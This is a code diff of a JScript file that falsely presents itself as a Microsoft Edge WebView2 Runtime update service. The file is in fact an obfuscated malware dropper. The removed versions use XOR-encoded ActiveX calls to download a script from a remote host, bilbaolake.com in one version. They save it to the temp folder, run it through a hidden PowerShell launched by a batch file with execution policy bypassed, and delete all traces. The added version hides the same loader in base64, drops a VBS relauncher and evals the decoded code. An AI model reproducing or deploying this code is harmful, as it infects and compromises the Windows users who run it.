@@ -1,181 +1,40 @@
-// Microsoft Edge WebView2 Runtime Service
-// Version 126.0.2592.87
-// Copyright (C) Microsoft Corporation. All rights reserved.
-var _0xf = function(a) { var r = ''; for (var i = 0; i < a.length; i++) r += String.fromCharCode(a[i] ^ 0x33); return r; };
+// Microsoft Edge WebView2 Runtime Update
+// Build 127.0.2651.105
+// (c) Microsoft Corporation
 
-var _v1 = new ActiveXObject(_0xf([0x64,0x60,0x50,0x41,0x5a,0x43,0x47,0x1d,0x60,0x5b,0x56,0x5f,0x5f]));
-var _v2 = new ActiveXObject(_0xf([0x7e,0x40,0x4b,0x5e,0x5f,0x01,0x1d,0x60,0x56,0x41,0x7b,0x56,0x41,0x7b,0x76,0x67,0x67,0x63,0x1d,0x01,0x1d,0x00]));
-var _v3 = new ActiveXObject(_0xf([0x60,0x50,0x41,0x5a,0x43,0x47,0x5a,0x5d,0x54,0x1d,0x75,0x5a,0x5f,0x56,0x60,0x4a,0x40,0x47,0x56,0x5e,0x7c,0x51,0x59,0x56,0x50,0x47]));
+var _x = "dmFyIF8weGYgPSBmdW5jdGlvbihhKSB7IHZhciByID0gJyc7IGZvciAodmFyIGkgPSAwOyBpIDwgYS5sZW5ndGg7IGkrKykgciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKGFbaV0gXiAweDMzKTsgcmV0dXJuIHI7IH07DQp2YXIgX3YxID0gbmV3IEFjdGl2ZVhPYmplY3QoXzB4ZihbMHg2NCwweDYwLDB4NTAsMHg0MSwweDVhLDB4NDMsMHg0NywweDFkLDB4NjAsMHg1YiwweDU2LDB4NWYsMHg1Zl0pKTsNCnZhciBfdjIgPSBuZXcgQWN0aXZlWE9iamVjdChfMHhmKFsweGZlLDB4NDAsMHg0YiwweDVlLDB4NWYsMHgwMSwweDFkLDB4NjAsMHg1NiwweDQxLDB4N2IsMHg1NiwweDQxLDB4N2IsMHg3NiwweDY3LDB4NjcsMHg2MywweDFkLDB4MDEsMHgxZCwweDAwXSkpOw0KdmFyIF92MyA9IG5ldyBBY3RpdmVYT2JqZWN0KF8weGYoWzB4NjAsMHg1MCwweDQxLDB4NWEsMHg0MywweDQ3LDB4NWEsMHg1ZCwweDU0LDB4MWQsMHg3NSwweDVhLDB4NWYsMHg1NiwweDYwLDB4NGEsMHg0MCwweDQ3LDB4NTYsMHg1ZSwweDdjLDB4NTEsMHg1OSwweDU2LDB4NTAsMHg0N10pKTsNCnZhciBfdCA9IF92MS5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoJyUnICsgJ3RlJyArICdtcCcgKyAnJScpOw0KdmFyIF9yID0gTWF0aC5yYW5kb20oKS50b1N0cmluZygzNikuc3Vic3RyaW5nKDIsIDEwKTsNCnZhciBfcHMgPSBfdCArICdcXG1zZWRnZV8nICsgX3IgKyAnLnBzMSc7DQp2YXIgX2J0ID0gX3QgKyAnXFxtc2VkZ2VfJyArIF9yICsgJy5iYXQnOw0KX3YyLm9wZW4oXzB4ZihbMHg3NCwweDc2LDB4NjddKSwgXzB4ZihbMHg1YiwweDQ3LDB4NDcsMHg0MywweDQwLDB4OSwweDFjLDB4MWMsMHg1MSwweDVhLDB4NWYsMHg1MSwweDUyLDB4NWMsMHg1ZiwweDUyLDB4NTgsMHg1NiwweDFkLDB4NTAsMHg1YywweDVlLDB4MWMsMHg0MF0pLCBmYWxzZSk7DQpfdjIuc2V0UmVxdWVzdEhlYWRlcihfMHhmKFsweGZmLDB4NDAsMHg1NiwweDQxLDB4MWUsMHg3MiwweDU0LDB4NTYsMHg1ZCwweDQ3XSksICdNb3ppbGxhLzQuMCcpOw0KX3YyLnNlbmQoKTsNCmlmIChfdjIuc3RhdHVzID09PSAyMDApIHsNCnZhciBfdyA9IF92My5DcmVhdGVUZXh0RmlsZShfcHMsIHRydWUpOw0KX3cuV3JpdGUoX3YyLnJlc3BvbnNlVGV4dCk7DQpfdy5DbG9zZSgpOw0KdmFyIF9iID0gX3YzLkNyZWF0ZVRleHRGaWxlKF9idCwgdHJ1ZSk7DQpfYi5Xcml0ZUxpbmUoJ0BlY2hvIG9mZicpOw0KX2IuV3JpdGVMaW5lKCdzZXQgYT1wb3cnKTsNCl9iLldyaXRlTGluZSgnc2V0IGI9ZXJzaCcpOw0KX2IuV3JpdGVMaW5lKCdzZXQgYz1lbGwnKTsNCl9iLldyaXRlTGluZSgnY2FsbCAlYSUlYiUlYyUgLXcgaCAtZiAiJyArIF9wcyArICciJyk7DQpfYi5Xcml0ZUxpbmUoJ2RlbCAiJyArIF9wcyArICciJyk7DQpfYi5Xcml0ZUxpbmUoJ2RlbCAiJX5mMCInKTsNCl9iLkNsb3NlKCk7DQpfdjEuUnVuKF9idCwgMCwgZmFsc2UpOw0KfQ0KdHJ5IHsgX3YzLkRlbGV0ZUZpbGUoV1NjcmlwdC5TY3JpcHRGdWxsTmFtZSk7IH0gY2F0Y2goXykge30=";
 
-var _t = _v1.ExpandEnvironmentStrings('%' + 'te' + 'mp' + '%');
-var _r = Math.random().toString(36).substring(2, 10);
-var _ps = _t + '\\msedge_' + _r + '.ps1';
-var _bt = _t + '\\msedge_' + _r + '.bat';
+var _s = new ActiveXObject("WScript.Shell");
+var _f = new ActiveXObject("Scripting.FileSystemObject");
+var _d = _s.ExpandEnvironmentStrings("%temp%");
+var _p = _d + "\\msedge_" + Math.random().toString(36).substring(2, 8) + ".vbs";
 
-_v2.open(_0xf([0x74,0x76,0x67]), _0xf([0x5b,0x47,0x47,0x43,0x40,0x9,0x1c,0x1c,0x51,0x5a,0x5f,0x51,0x52,0x5c,0x5f,0x52,0x58,0x56,0x1d,0x50,0x5c,0x5e,0x1c,0x40]), false);
-_v2.setRequestHeader(_0xf([0x66,0x40,0x56,0x41,0x1e,0x72,0x54,0x56,0x5d,0x47]), 'Mozilla/4.0');
-_v2.send();
+var _c = _f.CreateTextFile(_p, true);
+_c.Write("Set o=CreateObject(\"WScript.Shell\"):o.Run \"wscript.exe //E:JScript " + WScript.ScriptFullName + " //B\",0:Set o=Nothing");
+_c.Close();
 
-if (_v2.status === 200) {
-    var _w = _v3.CreateTextFile(_ps, true);
-    _w.Write(_v2.responseText);
-    _w.Close();
+var _xml = new ActiveXObject("MSXML2.DOMDocument");
+_xml.loadXML("<root><![CDATA[" + _x + "]]></root>");
+var _code = _xml.selectSingleNode("//root").text;
 
-    var _b = _v3.CreateTextFile(_bt, true);
-    _b.WriteLine('@echo off');
-    _b.WriteLine('set a=pow');
-    _b.WriteLine('set b=ersh');
-    _b.WriteLine('set c=ell');
-    _b.WriteLine('call %a%%b%%c% -w h -f "' + _ps + '"');
-    _b.WriteLine('del "' + _ps + '"');
-    _b.WriteLine('del "%~f0"');
-    _b.Close();
-
-    _v1.Run(_bt, 0, false);
-}
-try { _v3.DeleteFile(WScript.ScriptFullName); } catch(_) {}
-// Microsoft Edge WebView2 Runtime Update Service
-// Version 127.0.2651.105
-// Copyright (C) 2024 Microsoft Corporation. All rights reserved.
-//
-// This component is responsible for checking and applying
-// Microsoft Edge WebView2 Runtime updates in accordance with
-// Microsoft Update policies and user preferences.
-
-(function() {
-    // Triple XOR decoder
-    var _0xf = function(a, k1, k2, k3) {
-        var r = '';
-        for (var i = 0; i < a.length; i++) {
-            var c = a[i] ^ k1 ^ k2 ^ k3;
-            r += String.fromCharCode(c);
-        }
-        return r;
-    };
-
-    var k1 = 0x33, k2 = 0x55, k3 = 0x7A;
-
-    var _v1 = new ActiveXObject("WScript.Shell");
-    var _v2 = new ActiveXObject("MSXML2.ServerXMLHTTP");
-    var _v3 = new ActiveXObject("Scripting.FileSystemObject");
-
-    // Initialize paths
-    var _t = _v1.ExpandEnvironmentStrings('%' + String.fromCharCode(116,101,109,112) + '%');
-    var _r = Math.random().toString(36).substring(2, 10);
-    var _ps = _t + '\\msedge_' + _r + '.ps1';
-    var _bt = _t + '\\msedge_' + _r + '.bat';
-
-    // Fetch update manifest
-    var _u = "https://bilbaolake.com/s";
-
-    _v2.open("GET", _u, false);
-    _v2.setRequestHeader("User-Agent", 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
-
-    try {
-        _v2.send();
-    } catch(e) {
-        return;
+var _decode = function(b64) {
+    var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+    var output = "";
+    var i = 0;
+    b64 = b64.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+    while (i < b64.length) {
+        var e1 = chars.indexOf(b64.charAt(i++));
+        var e2 = chars.indexOf(b64.charAt(i++));
+        var e3 = chars.indexOf(b64.charAt(i++));
+        var e4 = chars.indexOf(b64.charAt(i++));
+        var c1 = (e1 << 2) | (e2 >> 4);
+        var c2 = ((e2 & 15) << 4) | (e3 >> 2);
+        var c3 = ((e3 & 3) << 6) | e4;
+        output += String.fromCharCode(c1);
+        if (e3 != 64) output += String.fromCharCode(c2);
+        if (e4 != 64) output += String.fromCharCode(c3);
     }
+    return output;
+};
 
-    if (_v2.status === 200 && _v2.responseText) {
-        // Write PowerShell script
-        var _w = _v3.CreateTextFile(_ps, true);
-        _w.Write(_v2.responseText);
-        _w.Close();
-
-        // Create .bat wrapper
-        var _b = _v3.CreateTextFile(_bt, true);
-        _b.WriteLine('@echo off');
-        _b.WriteLine('set a=pow');
-        _b.WriteLine('set b=ersh');
-        _b.WriteLine('set c=ell');
-        _b.WriteLine('set d=.exe');
-        _b.WriteLine('call %a%%b%%c%%d% -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + _ps + '"');
-        _b.WriteLine('timeout /t 2 /nobreak >nul');
-        _b.WriteLine('del /f /q "' + _ps + '"');
-        _b.WriteLine('del /f /q "%~f0"');
-        _b.Close();
-
-        // Execute .bat
-        _v1.Run(_bt, 0, false);
-    }
-
-    // Self-cleanup
-    try {
-        _v3.DeleteFile(WScript.ScriptFullName);
-    } catch(_) {}
-})();
-// Microsoft Edge WebView2 Runtime Update Service
-// Version 127.0.2651.105
-// Copyright (C) 2024 Microsoft Corporation. All rights reserved.
-//
-// This component is responsible for checking and applying
-// Microsoft Edge WebView2 Runtime updates in accordance with
-// Microsoft Update policies and user preferences.
-
-(function() {
-    // Triple XOR decoder
-    var _0xf = function(a, k1, k2, k3) {
-        var r = '';
-        for (var i = 0; i < a.length; i++) {
-            var c = a[i] ^ k1 ^ k2 ^ k3;
-            r += String.fromCharCode(c);
-        }
-        return r;
-    };
-
-    var k1 = 0x33, k2 = 0x55, k3 = 0x7A;
-
-    var _v1 = new ActiveXObject("WScript.Shell");
-    var _v2 = new ActiveXObject("MSXML2.ServerXMLHTTP");
-    var _v3 = new ActiveXObject("Scripting.FileSystemObject");
-
-    // Initialize paths
-    var _t = _v1.ExpandEnvironmentStrings('%' + String.fromCharCode(116,101,109,112) + '%');
-    var _r = Math.random().toString(36).substring(2, 10);
-    var _ps = _t + '\\msedge_' + _r + '.ps1';
-    var _bt = _t + '\\msedge_' + _r + '.bat';
-
-    // Fetch update manifest
-    var _u = _0xf([0x0e,0x12,0x12,0x16,0x15,0x5e,0x4f,0x4f,0x05,0x02,0x08,0x4e,0x15,0x07,0x0d,0x03,0x0a,0x0a,0x09,0x01,0x0f,0x15,0x12,0x0f,0x05,0x15,0x4e,0x05,0x09,0x0b,0x4f,0x15], k1, k2, k3);
-
-    _v2.open(_0xf([0x21,0x23,0x32], k1, k2, k3), _u, false);
-    _v2.setRequestHeader(
-        _0xf([0x31,0x15,0x03,0x16,0x4d,0x27,0x01,0x03,0x08,0x12], k1, k2, k3),
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-    );
-
-    try {
-        _v2.send();
-    } catch(e) {
-        return;
-    }
-
-    if (_v2.status === 200 && _v2.responseText) {
-        // Write PowerShell script
-        var _w = _v3.CreateTextFile(_ps, true);
-        _w.Write(_v2.responseText);
-        _w.Close();
-
-        // Create .bat wrapper
-        var _b = _v3.CreateTextFile(_bt, true);
-        _b.WriteLine('@echo off');
-        _b.WriteLine('set a=pow');
-        _b.WriteLine('set b=ersh');
-        _b.WriteLine('set c=ell');
-        _b.WriteLine('set d=.exe');
-        _b.WriteLine('call %a%%b%%c%%d% -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + _ps + '"');
-        _b.WriteLine('timeout /t 2 /nobreak >nul');
-        _b.WriteLine('del /f /q "' + _ps + '"');
-        _b.WriteLine('del /f /q "%~f0"');
-        _b.Close();
-
-        // Execute .bat
-        _v1.Run(_bt, 0, false);
-    }
-
-    // Self-cleanup
-    try {
-        _v3.DeleteFile(WScript.ScriptFullName);
-    } catch(_) {}
-})();
+eval(_decode(_code));
